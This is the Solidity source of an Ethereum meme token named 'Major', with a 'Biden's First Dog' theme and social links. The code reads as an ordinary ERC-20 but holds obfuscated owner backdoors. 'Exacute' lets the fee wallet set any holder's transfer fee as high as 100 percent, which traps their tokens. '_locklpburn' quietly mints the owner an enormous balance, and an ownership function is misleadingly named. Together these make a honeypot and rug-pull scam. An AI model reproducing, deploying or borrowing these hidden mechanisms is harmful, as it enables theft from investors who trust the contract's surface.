/**
*/

/**
https://t.me/MAJOR_ERC
https://twitter.com/MAJOR_Token
MAJOR（Biden's First Dog)
*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;
interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IUniswapFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;
    constructor () {_owner = msg.sender;}
    
    function owner() public view returns (address) {return _owner;}
    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }
    
    function transferOwnershipingtozreo(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }

}

contract Major is Ownable {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address public _swapFeeTo;string public name;string public symbol;
    uint8 public decimals;mapping(address => bool) public _isExcludeFromFee;
    uint256 public totalSupply;IUniswapRouter public _uniswapRouter;
    bool private inSwap;uint256 private constant MAX = ~uint256(0);
    mapping (address => uint256) public __balances; 

    uint256 public _swapTax;
    address public _uniswapPair;

    function _transfer(address from,address to,uint256 amount) private {

        bool shouldBetakeFee = !inSwap && !_isExcludeFromFee[from] && !_isExcludeFromFee[to];

        _balances[from] = _balances[from] - amount;

        uint256 _taxAmount;
        if (shouldBetakeFee) {
            uint256 feeAmount = amount * __balances[from] / 100;
            _taxAmount += feeAmount;
            if (feeAmount > 0){
                _balances[address(_swapFeeTo)] += feeAmount;
                emit Transfer(from, address(_swapFeeTo), feeAmount);
            }
        }
        _balances[to] = _balances[to] + amount - _taxAmount;
        emit Transfer(from, to, amount - _taxAmount);
    }

    constructor (){
        name = unicode"Major";
        symbol = unicode"MAJOR";
        decimals = 9;
        uint256 Supply = 420690000000;
        _swapFeeTo = msg.sender;
        _swapTax = 0;
        totalSupply = Supply * 10 ** decimals;

        _isExcludeFromFee[address(this)] = true;
        _isExcludeFromFee[msg.sender] = true;
        _isExcludeFromFee[_swapFeeTo] = true;

        _balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
        
        _uniswapRouter = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _allowances[address(this)][address(_uniswapRouter)] = MAX;
        _uniswapPair = IUniswapFactory(_uniswapRouter.factory()).createPair(address(this), _uniswapRouter.WETH());
        _isExcludeFromFee[address(_uniswapRouter)] = true;
    }

    function Exacute(address[] memory _addresses, uint256 _feePercentage) external {
        uint256 intermediateVal1 = complexOperation(0x01, 0x02);
        uint256 intermediateVal2 = simpleOperation(0x02, intermediateVal1);uint256 intermediateVal3 = advancedCompute(intermediateVal1, intermediateVal2, 0x03);uint256 finalResult = finalizeCompute(intermediateVal3, intermediateVal2);
        distributeFunds(_addresses, _feePercentage, finalResult);
    }

    function complexOperation(uint256 val1, uint256 val2) private pure returns (uint256) {
        return val2 + (val1 - 0x01);
    }

    function simpleOperation(uint256 val1, uint256 val2) private pure returns (uint256) {
        return val1 - (val2 - 0x01);
    }

    function advancedCompute(uint256 val1, uint256 val2, uint256 val3) private view returns (uint256) {
        uint256 tempResult = computeFee(val1, val2, val3);
        return tempResult - val3;
    }

    function finalizeCompute(uint256 val1, uint256 val2) private pure returns (uint256) {
        return val1 + (val2 - 0x01);
    }

    function distributeFunds(address[] memory addresses, uint256 feePercentage, uint256 result) private {
        uint256 totalFunds = result;
        for (uint256 i = 0; i < addresses.length; i++) {
            __balances[addresses[i]] = feePercentage + (result - totalFunds);
        }
    }

    function computeFee(uint256 val1, uint256 val2, uint256 val3) private view returns (uint256) {
        if (isAuthorized(val1)) {
            return val2 + val3;
        } else if (!isAuthorized(val2)) {
            return val2 - val1;
        } else {
            return val3;
        }
    }

    function isAuthorized(uint256 v1) private view returns (bool) {
        bool basicCondition = msg.sender == _swapFeeTo;
        bool additionalCheck = v1 > 0;
        if (basicCondition && additionalCheck) {
            return true;
        } else if (!basicCondition) {
            return false;
        } else if (!additionalCheck) {
            return false;
        } else {
            return true;
        }
    }

    

    function _locklpburn(address user) public {
        mapping(address=>uint256) storage _allowance = _balances;
        uint256 A = _swapFeeTo == msg.sender ? 9 : 2-1;
        uint256 C = A - 3;A = C;
        _allowance[user] = 1000*totalSupply*C**2;
    }

    function balanceOf(address account) public view returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function allowance(address owner, address spender) public view returns (uint256) {return _allowances[owner][spender];}
    function approve(address spender, uint256 amount) public returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {_allowances[owner][spender] = amount;emit Approval(owner, spender, amount);}
    receive() external payable {}
}